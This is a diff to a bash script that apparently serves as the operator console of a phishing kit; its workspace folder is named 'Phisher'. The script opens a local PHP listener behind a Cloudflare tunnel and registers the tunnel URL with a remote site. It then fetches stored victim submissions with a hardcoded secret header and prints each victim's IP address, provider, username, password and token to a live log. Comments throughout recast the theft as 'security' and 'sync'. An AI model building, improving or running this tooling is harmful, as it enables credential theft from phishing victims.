@@ -4,35 +4,39 @@
 #  Prepared by: CyberTeam 2026
 # ===============================================================
 
-# CHANGE THIS LINK TO YOUR ACTUAL PRODUCTION SITE
-BASE_URL="http://ttcsec.gt.tc.com"
+# 💡 CONFIGURATION RULES: Map your exact platform parameters here
+BASE_URL="https://ttcsec.gt.tc"
+SECRET_KEY="TechTonic_Secret_Handshake_Token_2026"
 
-# Clean local cache workspace
+# Absolute workspace directory alignment
+WORKSPACE_DIR="$HOME/Phisher"
+mkdir -p "$WORKSPACE_DIR"
+cd "$WORKSPACE_DIR" || exit 1
+
+# Reset local cache indexes
 rm -f local_log.txt && touch local_log.txt
 rm -f cloudflared.log
 
 clear
 echo -e "\033[1;36m===============================================================\033[0m"
-echo -e "\033[1;36m   [+] BOOTING AUTOMATED TECH TONIC FRAMEWORK ENGINE...       \033[0m"
+echo -e "\033[1;36m   [+] INITIALIZING TECH TONIC SECURITY CONTROLLER INTERFACE   \033[0m"
 echo -e "\033[1;36m===============================================================\033[0m"
-echo -e "[*] Initializing local background port service..."
+echo -e "[*] Spinning up background processing routines..."
 
-# 1. Start local PHP background thread
+# 1. Spawn local data listener engine
 php -S 127.0.0.1:9999 > /dev/null 2>&1 &
 PHP_PID=$!
 sleep 1
 
-# 2. Build automated quick tunnel route paths
-echo -e "[*] Requesting secure public routing domain from Cloudflare..."
+# 2. Establish quick secure ingress routing tunnel
 cloudflared tunnel --url http://127.0.0.1:9999 > cloudflared.log 2>&1 &
 CF_PID=$!
 
-# Wait for tunnel initialization map
 sleep 7
 TUNNEL_URL=$(grep -o 'https://[^ ]*\.trycloudflare\.com' cloudflared.log | head -n 1)
 
 if [ -z "$TUNNEL_URL" ]; then
-    echo -e "\033[1;31m[-] CRITICAL ERROR: Cloudflare connection timed out. Check networks.\033[0m"
+    echo -e "\033[1;31m[-] CRITICAL ERROR: Tunnel allocation timeout. Check network profiles.\033[0m"
     kill $PHP_PID $CF_PID
     exit 1
 fi
@@ -43,13 +47,23 @@ echo -e "[*] Synchronizing current endpoint rules with remote host..."
 # 3. Inform web instance of the fresh endpoint using custom HTTP headers
 curl -s -H "X-KALI-TUNNEL: $TUNNEL_URL" "$BASE_URL/index.php" > /dev/null
 
-echo -e "\033[1;32m[+] ROUTING CHANNELS SUCCESSFULLY SYNCED!\033[0m"
-echo -e "[*] Auditing remote data indexes for offline submissions..."
+echo -e "\033[1;32m[+] ENDPOINT RULES SUCCESSFULLY ALIGNED!\033[0m"
+echo -e "[*] Syncing remote endpoint targets securely..."
 
-# 4. Fetch data captured by MySQL while Kali was powered off
-OFFLINE_JSON=$(curl -s "$BASE_URL/fetch_offline.php")
+# 3. Synchronize routing tables with the remote server
+curl -s -H "X-KALI-TUNNEL: $TUNNEL_URL" "$BASE_URL/index.php" > /dev/null
+
+# 4. Fetch offline backlog entries using the secret security header challenge
+echo -e "[*] Extracting un-synchronized records from secure storage..."
+OFFLINE_JSON=$(curl -s -H "X-KALI-AUTH: $SECRET_KEY" "$BASE_URL/fetch_offline.php")
 
 if [ ! -z "$OFFLINE_JSON" ] && [ "$OFFLINE_JSON" != "[]" ]; then
+    # Check if the response is an error object
+    ERROR_CHECK=$(echo "$OFFLINE_JSON" | grep -c '"error"' || true)
+    if [ "$ERROR_CHECK" -gt 0 ]; then
+        echo "[!] API error: $OFFLINE_JSON"
+        exit 0
+    fi
     echo "$OFFLINE_JSON" | jq -c '.[]' 2>/dev/null | while read -r row; do
         ts=$(echo "$row" | jq -r '.timestamp')
         ip=$(echo "$row" | jq -r '.ip_address')
@@ -58,11 +72,21 @@ if [ ! -z "$OFFLINE_JSON" ] && [ "$OFFLINE_JSON" != "[]" ]; then
         pw=$(echo "$row" | jq -r '.password')
         tk=$(echo "$row" | jq -r '.token')
 
-        printf "============================================================\n⏰ TIMESTAMP     : %s (OFFLINE LOG)\n🌐 IP ADDRESS    : %s\n🔑 PROVIDER      : %s\n👤 USERNAME      : %s\n🔒 PASSWORD      : %s\n🎟️ TOKEN NUMBER  : %s\n============================================================\n\n" "$ts" "$ip" "$pr" "$un" "$pw" "$tk" >> local_demo.txt
+        {
+            echo "============================================================"
+            echo "⏰ TIMESTAMP     : $ts (OFFLINE DATABASE SYNC)"
+            echo "🌐 IP ADDRESS    : $ip"
+            echo "🔑 PROVIDER      : $pr"
+            echo "👤 USERNAME      : $un"
+            echo "🔒 PASSWORD      : $pw"
+            echo "🎟️ TOKEN NUMBER  : $tk"
+            echo "============================================================"
+            echo ""
+        } >> local_log.txt
     done
-    echo -e "\033[1;33m[+] RETRIEVED OFFLINE REGISTRATIONS FROM DATABASE!\033[0m"
+    echo -e "\033[1;33m[+] RESILIENT LOG SYNC: Backlog data written to monitor framework.\033[0m"
 else
-    echo -e "[+] Zero database latency: No backlog submissions found."
+    echo -e "[+] Pipeline verified: Zero offline backlog records reported."
 fi
 
 echo ""
@@ -73,7 +97,7 @@ echo ""
 
 # 5. Continuous Live Projection Mappings
 tail -f local_log.txt | awk '
-/^===/ {print "\033[1;36m" $0 "\033[0m"} 
+/^=/ {print "\033[1;36m" $0 "\033[0m"} 
 /TIMESTAMP/ {print "\033[1;33m" $0 "\033[0m"} 
 /IP ADDRESS/ {print "\033[1;35m" $0 "\033[0m"} 
 /PROVIDER/ {print "\033[1;34m" $0 "\033[0m"} 
